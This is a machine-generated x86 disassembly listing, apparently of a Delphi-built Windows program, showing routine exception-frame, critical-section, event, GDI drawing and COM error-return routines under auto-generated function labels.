pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419de8
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
sub_419de1
jmp sub_403924
sub_419de8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419e74
jmp sub_403924
sub_419e91
jmp sub_403924
sub_419e98
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419ed4
retn
sub_419f57
jmp sub_403924
sub_419f5e
mov eax [ ebp - 0x8 ]
call sub_41ca98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f83
lea eax [ ebp - 0xc ]
call sub_403f20
retn
sub_419f7c
jmp sub_403924
sub_419f83
mov esp ebp
pop ebp
retn
sub_419fd3
jmp sub_403924
sub_419fda
pop esi
pop ecx
pop ebp
retn
sub_41a02d
jmp sub_403924
sub_41a034
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a03c
retn
sub_41a0b7
jmp sub_403924
sub_41a0be
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a15b
jmp sub_403924
sub_41a162
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a17f
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
sub_41a178
jmp sub_403924
sub_41a17f
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a184
retn
sub_41a1fe
jmp sub_403924
sub_41a205
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a20c
mov eax edx
mov edx ecx
call sub_407ee4
retn
sub_41a218
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41a230
sub_41a2a8
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41a318
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41a334
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41a528
mov eax [ eax + 0x18 ]
retn
sub_41a52c
mov eax [ eax + 0x14 ]
retn
sub_41a5c8
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41a7d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40271c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41a810
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41a828
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41a83c
mov edx sub_41a828
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41a884
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407ee4
retn
mov eax edx
mov edx ecx
call sub_407eac
retn
sub_41a920
retn
sub_41ac18
jmp sub_403924
sub_41ac1f
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41ac80
jmp sub_403924
sub_41ac87
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41accc
mov eax [ eax + 0x4 ]
call sub_40845c
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41acdc
mov eax [ eax + 0x4 ]
call sub_408488
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41ad18
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41aec1
jmp sub_403924
sub_41af20
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41afb0
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41b000
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41b1eb
jmp sub_403924
sub_41b1f2
mov esp ebp
pop ebp
retn
sub_41b29c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
retn
sub_41b324
mov [ eax + 0x18 ] edx
retn
sub_41b4a0
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_414af8
retn
sub_41b527
jmp sub_403924
sub_41b52e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b5da
jmp sub_403924
sub_41b5e1
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b785
jmp sub_403924
sub_41b7d7
jmp sub_403924
sub_41b7f6
jmp sub_403924
sub_41b7fd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b81c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41b815
jmp sub_403924
sub_41b81c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b8bf
jmp sub_403924
sub_41b947
jmp sub_403924
sub_41b954
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
pop ebx
retn
sub_41b96c
mov eax [ rw-data ]
call sub_41b954
retn
sub_41b9a4
push ebx
call sub_41492c
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41b96c
sub_41bb11
jmp sub_403924
sub_41bb18
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403f20
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41bc38
jmp sub_403924
sub_41bc3f
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41bd36
jmp sub_403924
sub_41bd53
jmp sub_403924
sub_41bd5a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41be58
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41a8a0
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41bf1c
push ebx
mov ebx eax
mov eax ebx
call sub_41d8d0
cmp al 0x9
sete al
pop ebx
retn
sub_41bf7b
jmp sub_403924
sub_41bf82
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41c028
jmp sub_403924
sub_41c02f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c2ae
jmp sub_403670
sub_41c2da
jmp sub_403670
sub_41c37c
jmp sub_403670
sub_41c41f
jmp sub_403670
sub_41c5f7
jmp sub_403670
sub_41c639
jmp sub_403924
sub_41c669
jmp sub_403924
sub_41c670
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c6df
jmp sub_403924
sub_41c7b6
jmp sub_403924
sub_41c7bd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ca90
mov dl 0x1
call sub_41b9f8
retn
sub_41cbc8
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_41cbd1
jmp sub_403924
j_sub_41cbc8
jmp sub_41cbc8
sub_41cbd8
pop ebx
mov esp ebp
pop ebp
retn
sub_41cbe0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41d9e0
mov eax [ rw-data ]
call sub_41b954
pop ebp
retn
j_sub_40379c
jmp sub_40379c
j_sub_40379c#2
jmp sub_40379c
sub_41cd8d
add [ edx - 0x76ffbe33 ] dl
retn
sub_41cdcc
jmp sub_403924
sub_41cdd3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ceb3
jmp sub_403924
sub_41ceba
mov esp ebp
pop ebp
retn
sub_41cf72
jmp sub_403924
sub_41cf79
pop ecx
pop ecx
pop ebp
retn
sub_41d27b
jmp sub_403924
sub_41d282
pop ebx
mov esp ebp
pop ebp
retn
sub_41d527
jmp sub_403924
sub_41d52e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403190
retn
sub_41d547
jmp sub_403924
sub_41d56b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403670
sub_41d5a2
jmp sub_403670
sub_41d5e1
jmp sub_403924
sub_41d5e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d60a
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403f44
retn
sub_41d603
jmp sub_403924
sub_41d60a
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d691
jmp sub_403670
sub_41d6be
jmp sub_403924
sub_41d6c5
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d6d0
push ecx
mov edx esp
mov ecx 0x4
call sub_41be94
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41b954
sub_41d7dd
jmp sub_403924
sub_41d7e4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d8c3
jmp sub_403924
sub_41d8ca
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d920
jmp sub_403924
sub_41d927
pop ebx
pop ecx
pop ebp
retn
sub_41db6f
jmp sub_403924
sub_41db76
pop ecx
pop ecx
pop ebp
retn
sub_41dbb9
jmp sub_403924
sub_41dbc0
pop ebx
pop ecx
pop ebp
retn
sub_41dc5c
jmp sub_403924
sub_41dc63
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dd11
jmp sub_403924
sub_41dd18
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dd24
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41df7f
jmp sub_403924
sub_41df86
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dfab
mov eax [ ebp - 0x8 ]
call sub_403190
mov eax [ ebp - 0x4 ]
call sub_403190
retn
sub_41dfa4
jmp sub_403924
sub_41dfab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dfd0
lea eax [ ebp - 0x1c ]
call sub_40578c
lea eax [ ebp - 0x18 ]
call sub_403f20
retn
sub_41dfc9
jmp sub_403924
sub_41dfd0
pop ebx
mov esp ebp
pop ebp
retn
sub_41e1e2
jmp sub_403924
sub_41e1e9
pop ebx
mov esp ebp
pop ebp
retn
sub_41e21c
mov eax [ eax + 0x30 ]
call sub_418314
retn
sub_41e28c
call sub_41e3bc
retn
sub_41e2d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b324
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41e3ab
jmp sub_403924
sub_41e3b2
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41e3bc
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41ab04
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41e3d4
test dl dl
je r-xdata
mov dl 0x8
call sub_420508
retn
mov dl 0x9
call sub_420508
retn
sub_41e42b
jmp sub_403924
sub_41e432
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41e4ca
jmp sub_403924
sub_41e4d1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e66f
jmp sub_403924
sub_41e676
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e9b7
jmp sub_403924
sub_41e9f9
jmp sub_403924
sub_41ea58
jmp sub_403924
sub_41ea5f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ec9c
mov dl 0x1
call sub_420508
retn
sub_41eca4
xor edx edx
call sub_420508
retn
sub_41ed9d
jmp sub_403924
sub_41ef73
jmp sub_403924
sub_41ef7a
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f148
jmp sub_403924
sub_41f14f
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f225
jmp sub_403924
sub_41f22c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f343
jmp sub_403924
sub_41f34a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f504
jmp sub_403924
sub_41f50b
pop ecx
pop ebp
retn
sub_41f596
jmp sub_403924
sub_41f59d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f604
jmp sub_403924
sub_41f60b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f689
jmp sub_403924
sub_41f690
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f6ad
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_41f6a6
jmp sub_403924
sub_41f6ad
pop ebx
pop ecx
pop ebp
retn
sub_41f768
jmp sub_403924
sub_41f76f
pop ebx
pop ecx
pop ebp
retn
sub_41f845
jmp sub_403924
sub_41f84c
pop ecx
pop ebp
retn
sub_41f850
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_41f957
jmp sub_403924
sub_41f95e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fb05
jmp sub_403924
sub_41fb84
jmp sub_403924
sub_41fb8b
mov esp ebp
pop ebp
retn
sub_41fc59
jmp sub_403924
sub_41fc60
pop ebx
mov esp ebp
pop ebp
retn
sub_41fd13
jmp sub_403924
sub_41fd1a
pop ebx
mov esp ebp
pop ebp
retn
sub_41fd79
jmp sub_403924
sub_41fd80
mov esp ebp
pop ebp
retn
sub_4201e5
jmp sub_403924
sub_42023f
jmp sub_403924
sub_420250
jmp sub_403670
sub_4202ac
jmp sub_403924
sub_4202b3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420312
jmp sub_403924
sub_420319
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420445
jmp sub_403924
sub_42044c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4204fa
jmp sub_403924
sub_420501
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420540
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cc74
sub_420574
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_42058c
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_420598
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_42058c
sub_4206be
jmp sub_403670
sub_4206ed
jmp sub_403924
sub_420723
jmp sub_403924
sub_42072a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420749
push rw-data
call LeaveCriticalSection
retn
sub_420742
jmp sub_403924
sub_420749
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420818
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_4209f4
sub_420878
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41c9e0
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_42088c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41c9e0
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_4208a0
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41ebd0
retn
sub_4208ac
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41ebd0
retn
sub_420b54
xor eax eax
retn
sub_420b58
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_420b60
xor eax eax
retn
sub_420b64
retn
sub_420b68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f74
pop esi
pop ebx
retn
sub_420b7c
mov eax [ eax + 0x4 ]
retn
sub_420b80
retn
sub_420b84
xor eax eax
retn
sub_420b88
retn
sub_420b8c
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_420b98
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_420ba4
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_420bb0
retn
sub_420bb4
xchg edx eax
call sub_41c684
retn
sub_420bbc
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_420c44
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_40338c
pop esi
retn
sub_420c58
retn
sub_420d38
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f74
pop esi
pop ebx
retn
sub_420d78
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_420ec4
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4033d8
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_420edc
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_420f64
retn
sub_420fac
retn
sub_420fe4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_420ffc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_421220
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_40338c
pop esi
pop ebx
retn
sub_421044
mov al 0x1
retn
sub_421048
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421050
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_4210f8
xor eax eax
retn
sub_4210fc
retn
sub_421128
retn
sub_4211c0
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4211d4
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_418314
retn
sub_42131b
jmp sub_403670
sub_421320
mov ebx 0x1
call sub_4039d8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421383
jmp sub_403670
sub_421388
mov ebx 0x80030103
call sub_4039d8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421406
jmp sub_403670
sub_42140b
mov ebx 0x80030009
call sub_4039d8
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_421469
jmp sub_403670
sub_42146e
mov ebx 0x8000ffff
call sub_4039d8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421639
jmp sub_403924
sub_42164a
jmp sub_403670
sub_42164f
mov [ ebp - 0x4 ] 0x8000ffff
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421678
lea eax [ ebp + 0xc ]
call sub_40578c
retn
sub_421671
jmp sub_403924
sub_421678
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_421684
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_421690
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_42169c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_4216a8
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_421717
jmp sub_403670
sub_42171c
mov esi 0x8000ffff
call sub_4039d8
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421730
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_42179d
jmp sub_403924
sub_4217a4
mov eax [ rw-data ]
call sub_403190
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4217b4
call sub_417a58
retn
sub_42187c
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_421a20
jmp sub_403924
sub_421a27
pop ebp
retn
sub_421ab5
jmp sub_403924
sub_421abc
pop ebp
retn
sub_421d95
jmp sub_403924
sub_421d9c
pop ebp
retn
sub_421da0
sub [ rw-data ] 0x1
retn
sub_4225c7
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] 0x0
int3
sub_422785
add eax 0xffffffd8
jmp sub_4267d8
sub_42278d
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_422cb0
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_422d24
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_422d98
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_422da4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_422e84
jmp sub_403924
sub_422e8b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422f1b
jmp sub_403924
sub_422fad
jmp sub_403924
sub_422fb4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423018
jmp sub_403924
sub_42301f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423087
jmp sub_403924
sub_42308e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423131
jmp sub_403924
sub_423138
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423590
push 0x33
mov ecx rw-data
call sub_417d94
retn
sub_4235a0
push 0x33
mov ecx rw-data
call sub_417d54
retn
sub_4235b0
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4235d4
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_4237a8
push 0x11
mov ecx rw-data
call sub_417d54
retn
sub_4238e8
push ebx
mov ebx eax
mov eax ebx
call sub_4235b0
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4239a2
jmp sub_403924
sub_4239a9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4235d4
retn
sub_4239bf
jmp sub_403924
sub_4239d8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_423a35
jmp sub_403924
sub_423a3c
pop ebx
pop ecx
pop ebp
retn
sub_423bb5
jmp sub_403924
sub_423bdd
jmp sub_403924
sub_423be4
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_423c50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404184
pop esi
pop ebx
retn
sub_423cc4
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_423c20
push eax
call MulDiv
neg eax
pop ebx
retn
sub_423d00
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_423d38
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_423d68
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_423e86
jmp sub_403924
sub_423e8d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4235d4
retn
sub_423ea3
jmp sub_403924
sub_423f19
jmp sub_403924
sub_423f20
pop ebx
pop ecx
pop ebp
retn
sub_423f24
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_423fda
jmp sub_403924
sub_424000
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424030
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_42413f
jmp sub_403924
sub_424146
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4235d4
retn
sub_42415c
jmp sub_403924
sub_4241d5
jmp sub_403924
sub_4241dc
pop ebx
pop ecx
pop ebp
retn
sub_42430d
jmp sub_403924
sub_424320
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424660
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_4248f4
jmp sub_403924
sub_4248fb
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_424904
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_42493c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_424948
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_424a88
retn
sub_424b51
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_424b68
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_424c54
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424c74
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424c94
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424cb4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
pop ebx
retn
sub_424ccc
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
pop ebx
retn
sub_424cf0
mov eax [ rw-data ]
call sub_424ccc
retn
sub_424d52
jmp sub_403924
sub_424d59
pop ecx
pop ebp
retn
sub_424df8
jmp sub_403924
sub_424dff
pop ebx
mov esp ebp
pop ebp
retn
sub_424ed1
jmp sub_403924
sub_424f62
jmp sub_403924
sub_424f69
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424f94
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_42507b
jmp sub_403924
sub_425228
jmp sub_403924
sub_42522f
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_425441
jmp sub_403924
sub_425448
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_4254e2
jmp sub_403924
sub_4256be
jmp sub_403924
sub_425778
jmp sub_403924
sub_42577f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42579f
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_425798
jmp sub_403924
sub_42579f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42592d
jmp sub_403924
sub_425af8
jmp sub_403924
sub_425aff
xor eax eax
pop edx
pop ecx
pop ecx
